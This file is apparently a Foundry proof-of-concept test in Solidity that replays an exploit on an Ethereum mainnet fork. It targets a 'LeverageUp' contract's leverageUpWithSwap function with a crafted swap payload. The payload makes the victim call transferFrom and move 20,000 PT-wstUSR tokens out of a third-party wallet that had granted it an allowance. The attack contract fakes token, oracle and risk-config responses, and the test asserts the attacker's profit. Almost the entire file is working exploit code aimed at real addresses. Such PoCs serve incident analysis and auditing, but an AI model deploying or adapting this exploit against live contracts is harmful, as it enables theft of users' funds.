
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 23145763;
    uint256 constant TX_TIMESTAMP = 1755252827;
    uint256 constant TX_BLOCK_NUMBER = 23145764;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttackContrac();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttackContrac() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntimeFallb();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return address(0);
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _installRuntimeFallb() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(
            Addresses.attack_contract,
            attack,
            Addresses.PT_wstUSR_25SEP2025,
            "PT-wstUSR-25SEP2025",
            20000000000000000000000
        );
    }
}

contract OurAttack {
    function attack() external payable {
        _executeSwapPath();
    }

    function _handleCallback() internal {
        replayedCallback1 = true;
    }

    function _handleCallback2() internal {
        replayedCallback2 = true;
    }

    function _handleCallback3() internal {
        replayedCallback3 = true;
    }

    function _handleCallback4() internal {
        replayedCallback4 = true;
    }

    function _executeSwapPath() internal {
        _readPoolState();
        _executeSwapPath2();
    }

    function _readPoolState() internal {
        IERC20Like(Addresses.PT_wstUSR_25SEP2025).balanceOf(Addresses.A_83ECCB_8290);
        IERC20Like(Addresses.PT_wstUSR_25SEP2025)
            .allowance(Addresses.A_83ECCB_8290, Addresses.LeverageUp);
    }

    function _executeSwapPath2() internal {
        {
            Abi_leverageUpWithSwap_Param1[] memory abiArg1 = new Abi_leverageUpWithSwap_Param1[](1);
            abiArg1[0] = Abi_leverageUpWithSwap_Param1({
                field0: address(this),
                field1: type(uint256).max,
                field2: type(uint256).max,
                field3: type(uint256).max,
                field4: type(uint256).max,
                field5: type(uint256).max,
                field6: true
            });
            Abi_leverageUpWithSwap_Param6[] memory abiArg6 = new Abi_leverageUpWithSwap_Param6[](1);
            abiArg6[0] = Abi_leverageUpWithSwap_Param6({
                field0: 4,
                field1: abi.encode(
                    SwapPayload({
                        asset: Addresses.PT_wstUSR_25SEP2025,
                        target: address(this),
                        callData: abi.encodeWithSelector(
                            IERC20Like.transferFrom.selector,
                            Addresses.A_83ECCB_8290,
                            address(this),
                            uint256(20000000000000000000000)
                        )
                    })
                )
            });
            ILeverageUp(Addresses.LeverageUp)
                .leverageUpWithSwap(address(this), abiArg1, address(this), 0, 1000000000000000000, 0, abiArg6);
        }
    }

    function _getBalance() internal {
        replayedCallback6 = true;
    }

    function _handleCallback5() internal {
        replayedCallback7 = true;
    }

    function _handleCallback6() internal {
        replayedCallback8 = true;
    }

    function _handleCallback7() internal {
        replayedCallback9 = true;
    }

    function _handleCallback8() internal {
        replayedCallback10 = true;
    }

    receive() external payable {}

    function balanceOf(address account) external view returns (uint256) {
        uint256 live = _tokenBal(account);
        if (live != 0) return live;
        return 2;
    }

    function symbol() external pure returns (string memory) {
        return "POC_HELPER";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function approve(address spender, uint256 allowance) external payable {
        spender;
        allowance;
        if (!replayedCallback1) _handleCallback();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function deposit(Abi_deposit_Param0 calldata amount) external payable {
        amount;
        if (!replayedCallback2) _handleCallback2();
        return;
    }

    function debtTokenAmountToCollateralTokenAmount(uint256 amount) external payable {
        amount;
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function transferFrom(address from, address to, uint256 amount) external payable {
        from;
        to;
        amount;
        if (!replayedCallback4) _handleCallback4();
        _recXferFrom();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function data() external payable {
        bytes memory ret = abi.encode(
            uint256(115792089237316195423570985008687907853269984665640564039457584007913129639935),
            uint256(115792089237316195423570985008687907853269984665640564039457584007913129639935),
            0x23E60d1488525bf4685f53b3aa8E676c30321066,
            0xA6dc1FC33C03513A762cdf2810f163B9B0FD3a71,
            0xA6dc1FC33C03513A762cdf2810f163B9B0FD3a71,
            0xA6dc1FC33C03513A762cdf2810f163B9B0FD3a71,
            0xA6dc1FC33C03513A762cdf2810f163B9B0FD3a71,
            0xA6dc1FC33C03513A762cdf2810f163B9B0FD3a71
        );
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function riskConfig() external payable {
        bytes memory ret = abi.encode(
            uint256(1000000000000000001),
            uint256(115792089237316195423570985008687907853269984665640564039457584007913129639935),
            uint256(0),
            uint256(115792089237316195423570985008687907853269984665640564039457584007913129639935),
            uint256(0),
            uint256(115792089237316195423570985008687907853269984665640564039457584007913129639935)
        );
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function oracle() external payable {
        bytes memory ret = abi.encode(0xA6dc1FC33C03513A762cdf2810f163B9B0FD3a71, uint256(0));
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function getPrice() external payable {
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000de0b6b3a7640000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.sig == 0x4d564d73) {
            _executeSwapPath();
            return;
        }
        if (msg.sig == 0x70a08231) {
            bytes memory ret = _balanceRet(hex"0000000000000000000000000000000000000000000000000000000000000002");
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _entryCb();
    }

    function _entryCb() internal {}

    bool private replayedCallback1;
    bool private replayedCallback2;
    bool private replayedCallback3;
    bool private replayedCallback4;
    bool private replayedCallback6;
    bool private replayedCallback7;
    bool private replayedCallback8;
    bool private replayedCallback9;
    bool private replayedCallback10;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _tokenBalanceLedger;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _tokenBal(address account) internal view returns (uint256) {
        return _tokenBalanceLedger[account];
    }

    function _setTokenBal(address account, uint256 amount) internal {
        _tokenBalanceLedger[account] = amount;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _tryHelperAt(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }

    function _balanceRet(bytes memory replayRet) internal view returns (bytes memory) {
        address account;
        assembly { account := calldataload(4) }
        uint256 live = _tokenBal(account);
        if (live != 0) return abi.encode(live);
        return replayRet;
    }

    function _recXferFrom() internal {
        address from;
        address to;
        uint256 amount;
        assembly {
            from := calldataload(4)
            to := calldataload(36)
            amount := calldataload(68)
        }
        if (_tokenBal(from) >= amount) _setTokenBal(from, _tokenBal(from) - amount);
        _setTokenBal(to, _tokenBal(to) + amount);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PT_wstUSR_25SEP2025 = 0x23E60d1488525bf4685f53b3aa8E676c30321066;
    address internal constant A_83ECCB_8290 = 0x83eCCb05386B2d10D05e1BaEa8aC89b5B7EA8290;
    address internal constant attack_contract = 0xA6dc1FC33C03513A762cdf2810f163B9B0FD3a71;
    address internal constant attacker_eoa = 0xa7E9B982B0e19A399bc737Ca5346EF0eF12046Da;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant LeverageUp = 0xF4a21Ac7e51d17A0e1C8B59f7a98bb7A97806f14;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

struct Abi_leverageUpWithSwap_Param1 {
    address field0;
    uint256 field1;
    uint256 field2;
    uint256 field3;
    uint256 field4;
    uint256 field5;
    bool field6;
}

struct Abi_leverageUpWithSwap_Param6 {
    uint8 field0;
    bytes field1;
}

struct SwapPayload {
    address asset;
    address target;
    bytes callData;
}

interface ILeverageUp {
    function leverageUpWithSwap(
        address,
        Abi_leverageUpWithSwap_Param1[] calldata,
        address,
        uint256,
        uint256,
        uint256,
        Abi_leverageUpWithSwap_Param6[] calldata
    ) external;
}

struct Abi_deposit_Param0 {
    address field0;
    uint256 field1;
    address field2;
}
